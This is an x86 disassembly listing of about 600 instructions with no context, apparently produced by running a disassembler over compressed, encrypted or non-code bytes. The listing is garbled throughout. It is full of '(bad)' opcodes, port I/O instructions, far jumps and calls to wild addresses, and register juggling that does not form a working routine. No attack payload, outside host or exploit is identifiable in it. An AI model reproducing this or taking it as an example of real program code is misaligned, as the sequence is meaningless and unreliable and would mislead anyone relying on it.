  40ee39:	(bad)  
  40ee3a:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ee40:	(bad)  
  40ee41:	sub    ebp,DWORD PTR [ebx]
  40ee43:	and    al,0x52
  40ee45:	(bad)  
  40ee46:	dec    edi
  40ee47:	inc    ebp
  40ee48:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ee4f:	add    BYTE PTR [ebp-0x7b],dh
  40ee52:	pop    eax
  40ee53:	add    BYTE PTR [edx+0x0],bl
  40ee56:	pop    edx
  40ee57:	dec    ebp
  40ee58:	jmp    DWORD PTR [ebx]
  40ee5a:	and    al,0xec
  40ee5c:	push   edx
  40ee5d:	out    0x64,eax
  40ee5f:	jmp    0xd3f2e464
  40ee64:	jmp    0x40eebe
  40ee66:	mov    al,0xfe
  40ee68:	dec    BYTE PTR [ebp-0x18fd8018]
  40ee6e:	add    BYTE PTR [esi+ebp*1],bh
  40ee71:	pop    edx
  40ee72:	icebp  
  40ee73:	mov    eax,cs
  40ee75:	ins    BYTE PTR es:[edi],dx
  40ee76:	adc    eax,0x75510000
  40ee7b:	mov    esi,0x70158
  40ee80:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ee86:	mov    edi,esp
  40ee88:	cld    
  40ee89:	jge    0x40ef00
  40ee8b:	(bad)  
  40ee8d:	aas    
  40ee8e:	and    al,0x6d
  40ee90:	adc    cl,0x1
  40ee93:	mov    eax,DWORD PTR [eax]
  40ee95:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ee9b:	dec    ebp
  40ee9c:	add    eax,ebp
  40ee9e:	add    BYTE PTR [edx],al
  40eea0:	fadd   DWORD PTR [eax]
  40eea2:	stc    
  40eea3:	enter  0xee00,0x8b
  40eea7:	sbb    eax,0x1
  40eeaa:	sbb    esi,ecx
  40eeac:	in     al,0x0
  40eeae:	in     eax,dx
  40eeaf:	add    BYTE PTR [eax],al
  40eeb1:	jne    0x40ee3e
  40eeb3:	cmp    edx,esp
  40eeb5:	jb     0x40eec0
  40eeb7:	jmp    0x40ef2e
  40eeb9:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eebf:	add    BYTE PTR [ebx+0x4d83d840],cl
  40eec5:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40eecb:	jb     0x40ee56
  40eecd:	pop    edx
  40eece:	fadd   QWORD PTR [ebx-0x7445faa1]
  40eed4:	or     dh,BYTE PTR [edx+0x0]
  40eed7:	inc    edx
  40eed8:	or     dl,bh
  40eeda:	xlat   BYTE PTR ds:[ebx]
  40eedb:	dec    edx
  40eedc:	push   edi
  40eedd:	add    al,0x7
  40eedf:	leave  
  40eee0:	rol    DWORD PTR [edx+eax*1],0x7
  40eee4:	add    ecx,ecx
  40eee6:	mov    edx,ecx
  40eee8:	int3   
  40eee9:	jmp    0x40eea9
  40eeeb:	mov    al,0x0
  40eeed:	(bad)  
  40eeee:	jne    0x40eed8
  40eef0:	mov    eax,DWORD PTR [edx]
  40eef2:	call   0xc1556bf7
  40eef7:	pop    edi
  40eef8:	add    ebx,DWORD PTR [ecx-0x37]
  40eefb:	pop    ecx
  40eefc:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40ef03:	push   es
  40ef04:	mov    eax,DWORD PTR [eax]
  40ef06:	int3   
  40ef07:	add    ch,al
  40ef09:	jae    0x40eef3
  40ef0b:	int    0x1
  40ef0d:	enter  0x3000,0x18
  40ef11:	add    BYTE PTR [ebp+0x75],al
  40ef14:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ef1a:	push   0x2
  40ef1c:	pop    ecx
  40ef1d:	add    BYTE PTR [eax],cl
  40ef1f:	push   ebx
  40ef20:	lea    edi,[edi+eax*2]
  40ef23:	mov    al,0x1
  40ef25:	jb     0x40ef27
  40ef27:	mov    al,0x10
  40ef29:	push   eax
  40ef2a:	add    al,0x75
  40ef2c:	add    BYTE PTR [ebx],ch
  40ef2e:	add    ebx,esp
  40ef30:	int3   
  40ef31:	jne    0x40ef43
  40ef33:	movsx  edx,cl
  40ef36:	add    DWORD PTR [eax],eax
  40ef38:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ef3f:	mov    gs,edi
  40ef41:	add    BYTE PTR [eax-0x50],ch
  40ef44:	add    al,ch
  40ef46:	mov    eax,DWORD PTR [ecx]
  40ef48:	sub    eax,DWORD PTR [eax]
  40ef4a:	jb     0x40efc1
  40ef4c:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ef50:	jge    0x40ef3a
  40ef52:	add    al,0x1
  40ef54:	add    DWORD PTR [eax],0x0
  40ef57:	jne    0x40ef59
  40ef59:	je     0x40efa0
  40ef5b:	mov    eax,DWORD PTR [edi]
  40ef5d:	ror    BYTE PTR [ebp+0x4d],1
  40ef60:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ef67:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ef6d:	mov    DWORD PTR [ebx],ebp
  40ef6f:	fadd   DWORD PTR [eax+0x75]
  40ef72:	inc    eax
  40ef73:	pop    eax
  40ef74:	lea    ebx,[ecx+0x4f]
  40ef77:	push   0xb1000003
  40ef7c:	out    dx,eax
  40ef7d:	add    ebp,DWORD PTR [edx+edx*2]
  40ef80:	add    BYTE PTR [ebx+ecx*4],bh
  40ef83:	mov    ch,BYTE PTR [ebx]
  40ef85:	jb     0x40eff9
  40ef87:	add    al,0x89
  40ef89:	push   eax
  40ef8a:	call   0x84293cfc
  40ef8f:	add    DWORD PTR [eax+eax*1],eax
  40ef92:	jae    0x40efa8
  40ef94:	icebp  
  40ef95:	inc    ebp
  40ef96:	mov    eax,DWORD PTR gs:[ecx]
  40ef99:	int3   
  40ef9a:	out    dx,al
  40ef9b:	loopne 0x40efea
  40ef9d:	sub    eax,DWORD PTR [edx]
  40ef9f:	push   0xffffff83
  40efa1:	pop    esi
  40efa2:	push   cs
  40efa3:	jl     0x40efbe
  40efa5:	add    al,0xaf
  40efa7:	xor    eax,0x832b6d00
  40efac:	mov    eax,DWORD PTR [edx]
  40efae:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40efb4:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40efba:	inc    ebp
  40efbb:	shr    ebx,0x3
  40efbe:	or     DWORD PTR [eax],0x4
  40efc1:	push   0xffffffa5
  40efc3:	pop    esi
  40efc4:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40efcb:	jmp    0x40f02a
  40efcd:	mov    edi,0xff0272
  40efd2:	fdivr  QWORD PTR [ebp+0x5d]
  40efd5:	push   0x4e
  40efd7:	pop    ecx
  40efd8:	call   0x4133dd
  40efdd:	mov    DWORD PTR [ebx],eax
  40efdf:	in     al,0xc8
  40efe1:	rol    BYTE PTR [ebp-0x75],0xc1
  40efe5:	call   0xaaf1c6
  40efea:	pop    esi
  40efeb:	enter  0xceff,0x8b
  40efef:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eff3:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40effa:	je     0x40effc
  40effc:	or     DWORD PTR [ebx-0x74183b24],eax
  40f002:	jne    0x40efe8
  40f004:	jmp    0x40efff
  40f006:	push   DWORD PTR [edx-0x24]
  40f009:	push   0x4d
  40f00b:	pop    ecx
  40f00c:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40f010:	jge    0x40f018
  40f012:	mov    eax,eax
  40f014:	sub    ebp,DWORD PTR [edx+0x24]
  40f017:	pop    esi
  40f018:	inc    ebp
  40f019:	mov    esp,0x8b6077
  40f01e:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40f024:	lods   al,BYTE PTR ds:[esi]
  40f025:	add    BYTE PTR [ebx],bh
  40f027:	enter  0xce73,0x49
  40f02b:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40f033:	stc    
  40f034:	jge    0x40f0a8
  40f036:	jnp    0xdd407397
  40f03c:	call   0xc3f112
  40f041:	fadd   st(0),st
  40f043:	dec    esi
  40f044:	ins    BYTE PTR es:[edi],dx
  40f045:	stc    
  40f046:	cmp    al,0x73
  40f048:	push   ebp
  40f049:	mov    eax,0xf8028b
  40f04e:	jne    0x40f011
  40f050:	mov    esi,ecx
  40f052:	mov    esp,DWORD PTR [ebp+0x2c]
  40f055:	add    edi,DWORD PTR [ebp-0x24]
  40f058:	sub    esp,eax
  40f05a:	and    al,0x45
  40f05c:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40f062:	sbb    al,0xee
  40f064:	pop    esi
  40f065:	call   0x80f095
  40f06a:	fsubr  st,st(3)
  40f06c:	sti    
  40f06d:	add    BYTE PTR gs:[ecx],bh
  40f070:	add    eax,esp
  40f072:	add    DWORD PTR [esi],eax
  40f074:	rol    DWORD PTR [ebp+0x8],0x29
  40f078:	mov    esp,eax
  40f07a:	clc    
  40f07b:	jne    0x40f0f2
  40f07d:	mov    eax,0x8b0673
  40f082:	loopne 0x40f0c9
  40f084:	loopne 0x40f00f
  40f086:	lods   al,BYTE PTR ds:[esi]
  40f087:	int3   
  40f088:	inc    ebp
  40f089:	mov    DWORD PTR gs:[eax+edi*8],eax
  40f08d:	add    al,0xc3
  40f08f:	sub    ecx,DWORD PTR [ebp+0x47]
  40f092:	(bad)  
  40f094:	shr    BYTE PTR [ebp-0x1f],0xe8
  40f098:	add    eax,DWORD PTR [eax]
  40f09a:	call   0x642b19f
  40f09f:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40f0a5:	dec    esi
  40f0a6:	ins    DWORD PTR es:[edi],dx
  40f0a7:	in     al,dx
  40f0a8:	lea    eax,[eax]
  40f0aa:	inc    ebp
  40f0ab:	inc    ebp
  40f0ac:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40f0b2:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40f0bc:	and    al,0xdc
  40f0be:	ror    DWORD PTR [edx+0x24],0xf7
  40f0c2:	or     BYTE PTR [ebp+0x4c],dh
  40f0c5:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40f0c9:	stos   BYTE PTR es:[edi],al
  40f0ca:	adc    edx,edi
  40f0cc:	inc    esp
  40f0cd:	add    edi,DWORD PTR [eax]
  40f0cf:	jne    0x40f0b4
  40f0d1:	mov    DWORD PTR [eax-0x7449db04],ecx
  40f0d7:	cmp    ecx,DWORD PTR [edi]
  40f0d9:	sub    BYTE PTR [ebp-0x7e],dl
  40f0dc:	sar    ebp,0xb
  40f0df:	jmp    FWORD PTR [edi+0x2400392a]
  40f0e5:	sub    esi,DWORD PTR [ebx-0x73]
  40f0e8:	mov    esp,DWORD PTR [ecx+edi*4]
  40f0eb:	mov    ecx,DWORD PTR [eax]
  40f0ed:	and    BYTE PTR [eax],al
  40f0ef:	jne    0x40f0bb
  40f0f1:	sub    ebp,ecx
  40f0f3:	sbb    BYTE PTR [esi+0x32],ah
  40f0f6:	dec    ebp
  40f0f7:	push   ebp
  40f0f8:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40f0fe:	ret    
  40f0ff:	mov    edx,ebp
  40f101:	leave  
  40f102:	sub    DWORD PTR [esi+0x24],ebx
  40f105:	ret    0x2b
  40f108:	pop    ax
  40f10a:	push   ebp
  40f10b:	rol    BYTE PTR [ebx],0xeb
  40f10e:	add    DWORD PTR [ecx+0x6c0001],0x40
  40f115:	jb     0x40f16c
  40f117:	ret    
  40f118:	in     al,dx
  40f119:	jecxz  0x40f0a6
  40f11b:	push   esi
  40f11c:	xchg   esp,eax
  40f11d:	jne    0x40f11f
  40f11f:	cmp    edx,DWORD PTR [esi+0x1c]
  40f122:	jne    0x40f108
  40f124:	mov    eax,DWORD PTR [ebp-0x77]
  40f127:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f12e:	mov    esi,DWORD PTR [ebp-0x75]
  40f131:	pop    esi
  40f132:	nop
  40f133:	mov    eax,DWORD PTR [eax]
  40f135:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f13b:	add    al,0x0
  40f13d:	inc    ebp
  40f13e:	mov    eax,DWORD PTR [ebx]
  40f140:	mov    ebp,ebx
  40f142:	cmp    al,0xf
  40f144:	or     al,al
  40f146:	inc    ebp
  40f147:	inc    ebp
  40f148:	xor    eax,0x8bc89c8b
  40f14d:	ins    BYTE PTR es:[edi],dx
  40f14e:	cld    
  40f14f:	add    BYTE PTR [edi+0x566c16c0],dh
  40f155:	add    BYTE PTR [ecx-0x5],dl
  40f158:	add    eax,0x17200
  40f15d:	sbb    al,0x85
  40f15f:	dec    esp
  40f160:	je     0x40f19a
  40f162:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f166:	add    BYTE PTR [ebx],bh
  40f168:	(bad)  
  40f169:	and    al,0x32
  40f16b:	jae    0x40f109
  40f16d:	mov    cl,cl
  40f16f:	inc    DWORD PTR [esp]
  40f172:	push   ebp
  40f173:	shr    esp,0x8
  40f176:	in     al,dx
  40f177:	push   esp
  40f178:	add    DWORD PTR [eax],esp
  40f17a:	add    bl,cl
  40f17c:	inc    ebp
  40f17d:	mov    bh,0x53
  40f17f:	add    BYTE PTR [ebp-0x17],al
  40f182:	push   esi
  40f183:	cmovne ecx,edx
  40f186:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f18a:	push   edi
  40f18b:	pop    ss
  40f18c:	xor    eax,0x89009cd9
  40f191:	add    ah,bh
  40f193:	sub    eax,DWORD PTR [ebp-0x3f]
  40f196:	aad    0x5
  40f198:	inc    ebp
  40f199:	add    edx,edx
  40f19b:	add    BYTE PTR [ebp-0x40],al
  40f19e:	xlat   BYTE PTR ds:[ebx]
  40f19f:	ins    BYTE PTR es:[edi],dx
  40f1a0:	inc    ebp
  40f1a1:	inc    eax
  40f1a2:	and    ecx,eax
  40f1a4:	dec    eax
  40f1a5:	add    eax,0x20204c45
  40f1aa:	inc    ebp
  40f1ab:	fnstcw WORD PTR [esi+0x29]
  40f1ae:	leave  
  40f1af:	add    BYTE PTR [esi+0xc000c0],bh
  40f1b5:	lea    eax,[esp-0x34]
  40f1b9:	ret    
  40f1ba:	mov    dh,0x8b
  40f1bc:	xor    edx,DWORD PTR [ecx+0x3]
  40f1bf:	mov    al,BYTE PTR [ecx+0x1]
  40f1c2:	sbb    BYTE PTR [eax],al
  40f1c4:	stc    
  40f1c5:	mov    esi,DWORD PTR [edx+0x8]
  40f1c8:	(bad)  
  40f1c9:	les    esi,FWORD PTR ss:[ecx]
  40f1cc:	(bad)  
  40f1cd:	mov    al,ch
  40f1cf:	add    esi,eax
  40f1d1:	add    dh,al
  40f1d3:	or     esi,eax
  40f1d5:	mov    dl,0xc7
  40f1d7:	add    esi,eax
  40f1d9:	add    al,cl
  40f1db:	push   cs
  40f1dc:	mov    BYTE PTR [edx+0xc601c9],0xca
  40f1e3:	or     BYTE PTR [ebx],dh
  40f1e5:	dec    ecx
  40f1e6:	lea    eax,[ebx]
  40f1e8:	or     eax,0x18fc0fc7
  40f1ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1ee:	(bad)  
  40f1f0:	fiadd  WORD PTR [ebp-0x78]
  40f1f3:	jae    0xed75f942
  40f1f9:	or     BYTE PTR [ebp+0x7],al
  40f1fc:	loope  0x40f19b
  40f1fe:	inc    ebp
  40f1ff:	xor    dl,dh
  40f201:	pop    esi
  40f202:	inc    ebp
  40f203:	shr    edx,0xc
  40f206:	inc    ebp
  40f207:	and    ch,0x1
  40f20a:	inc    ebp
  40f20b:	add    bh,bl
  40f20d:	add    BYTE PTR [ebp-0x7b],al
  40f210:	out    dx,al
  40f211:	clc    
  40f212:	inc    ebp
  40f213:	ret    0xd7
  40f216:	inc    ebp
  40f217:	mov    edi,DWORD PTR [esi-0x7f]
  40f21a:	leave  
  40f21b:	sub    al,0x44
  40f21d:	add    BYTE PTR [ebx+ecx*4-0x76cce34a],bh
  40f224:	add    ebx,DWORD PTR [ecx+eax*2]
  40f227:	(bad)  
  40f228:	sbb    al,ah
  40f22a:	stc    
  40f22b:	test   DWORD PTR [edx-0x8],esi
  40f22e:	lea    edi,[edi-0x7007aa4]
  40f234:	mov    DWORD PTR [ebp-0x24],edi
  40f237:	(bad)  
  40f238:	dec    ebp
  40f239:	int3   
  40f23a:	mov    eax,0x71cdfcc6
  40f23f:	mov    BYTE PTR [ecx],0xce
  40f242:	(bad)  
  40f243:	(bad)  
  40f244:	dec    edi
  40f246:	jmp    FWORD PTR [edx-0x38]
  40f249:	(bad)  
  40f24a:	or     dl,al
  40f24c:	jge    0x40f214
  40f24e:	(bad)  
  40f24f:	shl    esp,1
  40f251:	xor    eax,DWORD PTR [ebp+0x45caf85a]
  40f257:	add    BYTE PTR [ebx+0xd8c8d],cl
  40f25d:	rdpmc  
  40f25f:	sbb    BYTE PTR [edi+0x7de08da],bh
  40f265:	mov    BYTE PTR [ebp+0x39063283],bl
  40f26b:	in     eax,dx
  40f26c:	cmovne ebx,DWORD PTR [edx]
  40f26f:	jecxz  0x40f271
  40f271:	inc    ebp
  40f272:	mov    esp,ecx
  40f274:	sbb    al,0x45
  40f276:	mov    ebx,edx
  40f278:	add    DWORD PTR [ebp+0x0],eax
  40f27b:	loopne 0x40f27e
  40f27d:	inc    ebp
  40f27e:	dec    ebp
  40f27f:	and    DWORD PTR [ebx+0x208045],ecx
  40f285:	inc    ebp
  40f286:	mov    DWORD PTR [esi+0x6a],edi
  40f289:	leave  
  40f28a:	mov    DWORD PTR [esp+edx*8-0x3c],0x33e5b6d6
  40f292:	inc    ebp
  40f293:	add    ebx,edi
  40f295:	inc    ecx
  40f296:	xlat   BYTE PTR ds:[ebx]
  40f297:	sbb    BYTE PTR [ebp-0x758d2b07],cl
  40f29d:	(bad)  
  40f29e:	xor    bh,BYTE PTR [eax+eax*4+0x8bd36c6]
  40f2a5:	(bad)  
  40f2a6:	dec    esi
  40f2a7:	mov    esi,0xbf45c6f3
  40f2ac:	mov    esi,eax
  40f2ae:	fadd   st,st(0)
  40f2b0:	inc    esi
  40f2b2:	(bad)  
  40f2b3:	rcl    esp,0xc6
  40f2b6:	inc    edx
  40f2b8:	push   eax
  40f2b9:	mov    BYTE PTR [ebp-0x3d],0x33
  40f2bd:	xor    eax,DWORD PTR [ebx]
  40f2bf:	lea    edx,[eax+0xd]
  40f2c2:	inc    ebp
  40f2c3:	jae    0x8c1b58e1
  40f2c9:	ficomp WORD PTR [eax+ecx*4]
  40f2cc:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f2d3:	test   esi,edi
  40f2d5:	(bad)  
  40f2d6:	(bad)  
  40f2d7:	inc    DWORD PTR [eax]
  40f2d9:	inc    ebp
  40f2da:	add    BYTE PTR [ebx-0x10aa23d0],cl
  40f2e0:	mov    edx,DWORD PTR [ebx]
  40f2e2:	cld    
  40f2e3:	mov    edi,ecx
  40f2e5:	mov    ecx,ebx
  40f2e7:	pop    esp
  40f2e8:	sar    edi,0x1e
  40f2eb:	cmp    ebp,esp
  40f2ed:	jne    0x40f362
  40f2ef:	mov    DWORD PTR ds:0x22450be4,ecx
  40f2f5:	loopne 0x40f2e3
  40f2f7:	pushf  
  40f2f8:	jae    0x40f285
  40f2fa:	add    eax,0x3388e91c
  40f2ff:	add    esp,ebp
  40f301:	add    BYTE PTR [ebx-0x40],dh
  40f304:	jmp    0x91f35f
  40f309:	mov    ebx,0x6a7275
  40f30e:	pop    ecx
  40f30f:	add    DWORD PTR [ebp+eax*4-0x77],esi
  40f313:	add    bh,BYTE PTR [eax+0x0]
  40f316:	dec    DWORD PTR [ebp+0x66]
  40f319:	mov    ecx,DWORD PTR [ebp-0xff0084]
  40f31f:	mov    DWORD PTR [edx-0x75],ebp
  40f322:	data16 sbb al,0x8d
  40f325:	mov    edi,edi
  40f327:	add    edi,edi
  40f329:	add    BYTE PTR [edx+0x1],ch
  40f32c:	data16 or BYTE PTR [ebp-0x1e00bb],cl
  40f333:	jmp    0xee6a:0xd84dc766
  40f33a:	pop    ecx
  40f33b:	jle    0x40f2c6
  40f33d:	inc    ebp
  40f33e:	sbb    BYTE PTR [esi-0x37],0x8
  40f342:	test   edx,ecx
  40f344:	(bad)  
  40f345:	jmp    0x41017c49
  40f34a:	push   ebp
  40f34b:	jne    0x40f3b3
  40f34d:	lea    ecx,[ebp-0x2c]
  40f350:	mov    DWORD PTR [ebp-0x200158],0xfe4585d6
  40f35a:	sar    bh,0xeb
  40f35d:	mov    eax,edi
  40f35f:	loopne 0x40f311
  40f361:	(bad)  
  40f362:	rol    ebx,cl
  40f364:	jmp    0xe9c0:0xdf1c458b
  40f36b:	push   eax
  40f36c:	inc    bp
  40f36e:	inc    ebp
  40f36f:	mov    eax,ebp
  40f371:	cwde   
  40f372:	mov    DWORD PTR [eax],0xd4ffc7d4
  40f378:	add    bh,bh
  40f37a:	add    BYTE PTR [ecx],al
  40f37c:	call   0x1400b81
  40f381:	inc    DWORD PTR [ebp-0xb201f8]
  40f387:	xor    eax,DWORD PTR [ebp-0xc401fd]
  40f38d:	jne    0x40f31a
  40f38f:	mov    eax,ds:0x33c70be0
  40f394:	ret    
  40f395:	out    dx,eax
  40f396:	mov    edx,DWORD PTR ds:0xbc0a31c
  40f39c:	push   eax
  40f39d:	xor    eax,DWORD PTR [ebp-0x71]
  40f3a0:	mov    esi,DWORD PTR [edx-0x68]
  40f3a3:	mov    ds:0x33ff0b00,eax
  40f3a8:	(bad)  
  40f3a9:	mov    ecx,0x8b8d0008
  40f3ae:	call   FWORD PTR [edi+edi*8]
  40f3b1:	and    bh,bh
  40f3b3:	push   0x66
  40f3b5:	mov    bp,0xff8d
  40f3b9:	(bad)  
  40f3ba:	(bad)  
  40f3bb:	dec    DWORD PTR [edi]
  40f3bd:	mov    DWORD PTR [edx],eax
  40f3bf:	jp     0x40f3c1
  40f3c1:	(bad)  
  40f3c2:	mov    ecx,0x774f59
  40f3c7:	mov    ecx,eax
  40f3c9:	jl     0x40f354
  40f3cb:	dec    DWORD PTR [eax-0x74c73fa7]
  40f3d1:	mov    DWORD PTR [esi+0x7e],esp
  40f3d4:	push   ebp
  40f3d5:	dec    DWORD PTR [ebp-0x7676f2a7]
  40f3db:	or     BYTE PTR [ebx+eiz*2+0x4d6666c2],0x55
  40f3e3:	xor    ecx,DWORD PTR [ebp-0x7627e877]
  40f3e9:	call   DWORD PTR [eax+0x668dc233]
  40f3ef:	test   al,0x55
  40f3f1:	mov    DWORD PTR [ebp-0x76bade7c],ecx
  40f3f7:	into   
  40f3f8:	xchg   esp,eax
  40f3f9:	loop   0x40f384
  40f3fb:	(bad)  
  40f3fc:	xchg   esi,eax
  40f3fd:	lods   al,BYTE PTR ds:[esi]
  40f3fe:	ret    0x8bd3
  40f401:	in     eax,dx
  40f402:	inc    bp
  40f404:	dec    ebp
  40f405:	in     al,0xb9
  40f407:	xor    BYTE PTR [edi-0x39],cl
  40f40a:	add    BYTE PTR [ecx+esi*8+0x64e189ec],dh
  40f411:	(bad)  
  40f412:	(bad)  
  40f413:	mov    eax,0x85667e8b
  40f418:	mov    ch,0xfe
  40f41a:	(bad)  
  40f41b:	(bad)  
  40f41c:	inc    DWORD PTR [eax]
  40f41e:	jno    0x40f420
  40f420:	data16 mov bl,0xb5
  40f423:	add    bh,bh
  40f425:	mov    edi,edi
  40f427:	fmul   QWORD PTR [ecx-0x729501]
  40f42d:	aam    0x8d
  40f42f:	call   edi
  40f431:	push   eax
  40f432:	mov    DWORD PTR [ebp+0x6c],eax
  40f435:	xor    edi,edi
  40f437:	add    eax,DWORD PTR [ebx-0x76bafcb0]
  40f43d:	sub    DWORD PTR [esi+0x44],0xffffffff
  40f441:	mov    ecx,DWORD PTR [ebp-0x767f1ee4]
  40f447:	add    DWORD PTR [eax+0x0],esi
  40f44a:	push   DWORD PTR [eax]
  40f44c:	push   bp
  40f44e:	lea    ecx,[ebp-0x8701]
  40f454:	mov    DWORD PTR [ecx+0x74],edx
  40f457:	sar    bh,1
  40f459:	or     DWORD PTR [ebx-0x48000386],0x77
  40f460:	fs test edi,edi
  40f463:	add    al,0x33
  40f465:	add    BYTE PTR [ebx],al
  40f467:	adc    dh,BYTE PTR [ebx]
  40f469:	add    BYTE PTR [esi-0x75],ah
  40f46c:	test   DWORD PTR [esi-0x1],esp
  40f46f:	inc    ebp
  40f470:	inc    DWORD PTR [ebx-0x2ff00abb]
  40f476:	dec    ebp
  40f477:	mov    DWORD PTR [ebx],esi
  40f479:	mov    al,BYTE PTR [ebx]
  40f47b:	push   ecx
  40f47c:	xor    esp,DWORD PTR [esi+0x66]
  40f47f:	push   ebp
  40f480:	inc    ebp
  40f481:	xor    DWORD PTR [ebx],0x8
  40f484:	mov    WORD PTR [ebp-0x72],ax
  40f488:	push   cx
  40f48a:	inc    ebp
  40f48b:	adc    WORD PTR [ebp-0x64],0xff83
  40f490:	mov    DWORD PTR [ebx],0x92b589f8
  40f496:	clc    
  40f497:	push   ecx
  40f498:	inc    ebp
  40f499:	data16 cmc 
  40f49b:	push   ebp
  40f49c:	pushf  
  40f49d:	data16 (bad) 
  40f49f:	dec    ebp
  40f4a0:	in     al,0x83
  40f4a2:	test   DWORD PTR [edi-0x76ba3508],eax
  40f4a8:	xor    ebx,DWORD PTR [eax+0xc7329c]
  40f4ae:	in     al,0x8b
  40f4b0:	add    eax,0x45b5f866
  40f4b5:	dec    DWORD PTR [ebx+0xf094ff]
  40f4bb:	mov    DWORD PTR [ecx+0x45fff466],ecx
  40f4c1:	lea    ecx,[ebx-0x4e76e3b3]
  40f4c7:	push   0x6600ff01
  40f4cc:	push   cs
  40f4cd:	test   DWORD PTR [eax+0xff01ff],eax
  40f4d3:	inc    ecx
  40f4d4:	inc    ebp
  40f4d5:	mov    WORD PTR [ebp-0x360018],ax
  40f4dc:	push   cs
  40f4dd:	shl    BYTE PTR [ebp+0x66],0x8b
  40f4e1:	test   DWORD PTR [edi+edi*8],ebx
  40f4e4:	cs (bad) 
  40f4e6:	inc    DWORD PTR [ecx-0x75]
  40f4e9:	data16 in al,dx
  40f4eb:	test   DWORD PTR [eax],ecx
  40f4ed:	inc    DWORD PTR [eax]
  40f4ef:	inc    DWORD PTR [ecx-0x77]
  40f4f2:	mov    esi,DWORD PTR [edx-0x77]
  40f4f5:	call   FWORD PTR [eax]
  40f4f7:	leavew 
  40f4f9:	xchg   ebp,eax
  40f4fa:	inc    edi
  40f4fb:	push   DWORD PTR [ebp-0x1]
  40f4fe:	call   0xff50e048
  40f503:	lea    eax,[ebp-0x1]
  40f506:	mov    edi,edi
  40f508:	enter  0xc7,0xc3
  40f50c:	mov    eax,ecx
  40f50e:	xor    ecx,DWORD PTR [ecx-0x749bfd]
  40f514:	sbb    al,0x8b
  40f516:	sbb    esp,edi
  40f518:	dec    ebp
  40f519:	mov    bh,0x8b
  40f51b:	mov    ah,cl
  40f51d:	mov    DWORD PTR [eax],0x8bc1ffc3
  40f523:	mov    eax,ebx
  40f525:	mov    BYTE PTR [eax],al
  40f527:	sar    bh,0x89
  40f52a:	sub    BYTE PTR [eax-0x77ff766c],cl
  40f530:	mov    esp,DWORD PTR [ebp+0x7c]
  40f533:	add    BYTE PTR [eax],al
  40f535:	inc    ebp
  40f536:	mov    esi,DWORD PTR ds:0xc7049c8d
  40f53c:	or     ah,bl
  40f53e:	add    BYTE PTR [ebp+0x458bf800],0x85
  40f545:	xor    DWORD PTR [edi],ecx
  40f547:	pushf  
  40f548:	js     0x40f511
  40f54a:	add    al,dh
  40f54c:	mov    eax,DWORD PTR [ebp+0x4509f8f4]
  40f552:	inc    eax
  40f553:	xor    eax,0x8b209f89
  40f558:	call   FWORD PTR [ebx+ecx*4]
  40f55b:	cmp    al,0x1
  40f55e:	mov    DWORD PTR [eax],0x8b8545c3
  40f564:	call   FWORD PTR [edi+edi*8]
  40f567:	dec    ebp
  40f568:	inc    ebp
  40f569:	mov    eax,DWORD PTR [ebx-0xffe374]
  40f56f:	mov    eax,DWORD PTR [eax]
  40f571:	mov    eax,edi
  40f573:	nop
  40f574:	ret    
  40f575:	add    BYTE PTR [ebp-0x130077],al
  40f57b:	jne    0x40f502
  40f57d:	test   edi,edi
  40f57f:	jne    0x40f580
  40f581:	dec    DWORD PTR [ebx-0x38aa1fe8]
  40f587:	call   0xffccf24f
  40f58c:	sbb    al,0x45
  40f58e:	stos   BYTE PTR es:[edi],al
  40f58f:	mov    eax,DWORD PTR [eax]
  40f591:	mov    edx,DWORD PTR [eax+0x3]
  40f594:	inc    ebp
  40f595:	cmp    al,0x8b
  40f597:	push   cs
  40f598:	cwde   
  40f599:	inc    ebp
  40f59a:	add    BYTE PTR [ebp-0xe78b39],al
  40f5a0:	call   FWORD PTR [esp+eax*1]
  40f5a3:	test   eax,0x8bffff00
  40f5a8:	mov    DWORD PTR [esp+eiz*4],ebx
  40f5ab:	adc    BYTE PTR [ebp+0x1],0x8b
  40f5af:	add    al,ch
  40f5b1:	add    al,dh
  40f5b3:	mov    DWORD PTR [ebp-0x3d],0x7589458b
  40f5ba:	mov    ecx,DWORD PTR [ebx-0x76cfe314]
  40f5c0:	inc    ebp
  40f5c1:	add    DWORD PTR [ebx-0x7aceb000],ecx
  40f5c7:	cmp    bh,0x1
  40f5ca:	inc    DWORD PTR [eax]
  40f5cc:	inc    ebp
  40f5cd:	push   eax
  40f5ce:	xor    ebp,ecx
  40f5d0:	add    eax,DWORD PTR [edx]
  40f5d2:	mov    DWORD PTR [eax],eax
  40f5d4:	and    al,0x80
  40f5d6:	inc    DWORD PTR [ecx]
  40f5d8:	lea    eax,[eax]
  40f5da:	pushf  
  40f5db:	or     BYTE PTR [ebp-0xfe00bb],al
  40f5e1:	jmp    0x13ff86b
  40f5e6:	dec    DWORD PTR [esi]
